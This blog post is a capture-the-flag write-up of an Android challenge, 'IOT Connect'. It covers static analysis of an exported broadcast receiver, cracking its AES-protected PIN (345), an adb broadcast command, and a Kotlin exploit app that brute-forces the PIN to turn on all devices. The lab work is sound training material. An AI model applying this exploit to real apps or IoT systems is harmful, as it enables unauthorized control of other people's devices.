---
date: '2025-03-20T16:28:41+08:00'
title: 'MHL IOT Connect'
tags:
    - MHL
    - Android CTF
---

## Challenge Description

> This challenge focuses on exploiting a security flaw related to the broadcast receiver in the "IOT Connect" application, allowing unauthorized users to activate the master switch, which can turn on all connected devices. The goal is to send a broadcast in a way that only authenticated users can trigger the master switch.
>
> [IOT Connect APK](static/IOTConnect.apk)

## Solution

As usual, I started by performing static analysis and dynamic analysis to fully understand what the code is doing. 

### Static Analysis

I started off by decompiling it using `jadx-gui`. The first thing I look into is the `AndroidManifest.xml`.

```xml
<activity
    android:name="com.mobilehackinglab.iotconnect.LoginActivity"
    android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.MAIN"/>
        <category android:name="android.intent.category.LAUNCHER"/>
    </intent-filter>
</activity>
<activity
    android:name="com.mobilehackinglab.iotconnect.SignupActivity"
    android:exported="true"/>
<activity
    android:name="com.mobilehackinglab.iotconnect.MainActivity"
    android:exported="true"/>
<receiver
    android:name="com.mobilehackinglab.iotconnect.MasterReceiver"
    android:enabled="true"
    android:exported="true">
    <intent-filter>
        <action android:name="MASTER_ON"/>
    </intent-filter>
</receiver>
```

I noticed there are several activity and a receiver have this setting `exported=true`. Since the description mentioned about the broadcast receiver, I focused on the `MasterReceiver`. Surprisingly, `MasterReceiver` does not has it's own activity. I then look around by using the global search feature.

```java
public void onReceive(Context context2, Intent intent) {
    if (Intrinsics.areEqual(intent != null ? intent.getAction() : null, "MASTER_ON")) {
        int key = intent.getIntExtra("key", 0);
        if (context2 != null) {
            if (Checker.INSTANCE.check_key(key)) {
                CommunicationManager.INSTANCE.turnOnAllDevices(context2);
                Toast.makeText(context2, "All devices are turned on", 1).show();
            } else {
                Toast.makeText(context2, "Wrong PIN!!", 1).show();
            }
        }
    }
}
```

After looking around, I managed to found the broadcast receiver code `MasterReceiver` under the `CommunicationManager` activity. The code basically getting an intent with a `MASTER_ON` action and a `key` extra. It then will check the key.

```java
public final class Checker {
    public static final Checker INSTANCE = new Checker();
    private static final String algorithm = "AES";
    private static final String ds = "OSnaALIWUkpOziVAMycaZQ==";

    private Checker() {
    }

    public final boolean check_key(int key) {
        try {
            return Intrinsics.areEqual(decrypt(ds, key), "master_on");
        } catch (BadPaddingException e) {
            return false;
        }
    }

    public final String decrypt(String ds2, int key) {
        Intrinsics.checkNotNullParameter(ds2, "ds");
        SecretKeySpec secretKey = generateKey(key);
        Cipher cipher = Cipher.getInstance(algorithm + "/ECB/PKCS5Padding");
        cipher.init(2, secretKey);
        if (Build.VERSION.SDK_INT >= 26) {
            byte[] decryptedBytes = cipher.doFinal(Base64.getDecoder().decode(ds2));
            Intrinsics.checkNotNull(decryptedBytes);
            return new String(decryptedBytes, Charsets.UTF_8);
        }
        throw new UnsupportedOperationException("VERSION.SDK_INT < O");
    }

    private final SecretKeySpec generateKey(int staticKey) {
        byte[] keyBytes = new byte[16];
        byte[] staticKeyBytes = String.valueOf(staticKey).getBytes(Charsets.UTF_8);
        Intrinsics.checkNotNullExpressionValue(staticKeyBytes, "getBytes(...)");
        System.arraycopy(staticKeyBytes, 0, keyBytes, 0, Math.min(staticKeyBytes.length, keyBytes.length));
        return new SecretKeySpec(keyBytes, algorithm);
    }
}
```

Double click the `check_key` will bring me to another code which basically check for the key. After understanding it, the code is a AES decryption and it basically check if the `key` can decrypt and return back the output `master_on`. It is possible to easily decrypt this and get the key.

### Dynamic Analysis

Now that I understand everything, I could just try to directly use `adb` to perform the attack. 

```powershell
adb shell am broadcast -a MASTER_ON --ei key 345
Broadcasting: Intent { act=MASTER_ON flg=0x400000 (has extras) }
Broadcast completed: result=0
```

```log
2025-03-20 16:58:20.315  5513-5513  TURN ON                 com.mobilehackinglab.iotconnect      D  Turning all devices on
2025-03-20 16:58:20.329  5513-5513  TURN ON                 com.mobilehackinglab.iotconnect      D  Turning all devices on
2025-03-20 16:58:20.373  5513-5513  TURN ON                 com.mobilehackinglab.iotconnect      D  Turning all devices on
```

By providing the required action `MASTER_ON` and correct key `345`, I could easily trigger the broadcast receiver to successfully trigger the `turnOnAllDevices` function.

### Creating Exploit App

It is also possible to perform Exploit App to perform the same thing. Do note that the victim app is needed to be run in background for the exploit to work.

```kotlin
class MainActivity : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()
        setContent {
            IOTkonekTheme {
                Scaffold(modifier = Modifier.fillMaxSize()) { innerPadding ->
                    Exploit(
                        modifier = Modifier.padding(innerPadding)
                    )
                }
            }
        }
    }
}

fun decrypt(): Int {
    val ds = "OSnaALIWUkpOziVAMycaZQ=="
    val algorithm = "AES"

    for (key in 0..9999) { // Brute-force search for the correct key
        try {
            val keyBytes = ByteArray(16)
            val keyString = key.toString().toByteArray(Charsets.UTF_8)
            System.arraycopy(keyString, 0, keyBytes, 0, minOf(keyString.size, keyBytes.size))

            val cipher = Cipher.getInstance("AES/ECB/PKCS5Padding")
            cipher.init(Cipher.DECRYPT_MODE, SecretKeySpec(keyBytes, algorithm))

            val decryptedBytes = cipher.doFinal(Base64.decode(ds, Base64.DEFAULT))
            val decryptedText = String(decryptedBytes, Charsets.UTF_8).trim()

            if (decryptedText == "master_on") {
                Log.i("KEY","Correct key found: $key")
                return key
            }
        } catch (_: Exception) {
            // Ignore errors for incorrect keys
        }
    }
    return 0
}

@Composable
fun Exploit(modifier: Modifier = Modifier) {
    val intent = Intent().apply {
        action = "MASTER_ON"
        putExtra("key", decrypt())
    }
    LocalContext.current.sendBroadcast(intent)
    Text(
        text = "hacking 101",
        modifier = modifier
    )

}
```

The kotlin code contains 2 function, one is the decrypt function to get the pin and another one is to perform the exploit by sending a broadcast. It will trigger the `turnOnAllDevices` function when the exploit app is runned and the victim app is running in background.

![alt text](img/index.png#center)

## Things I learned from this challenge

- `adb` to send broadcast
- `exported=true` is dangerous
- sending broadcast by creating android app



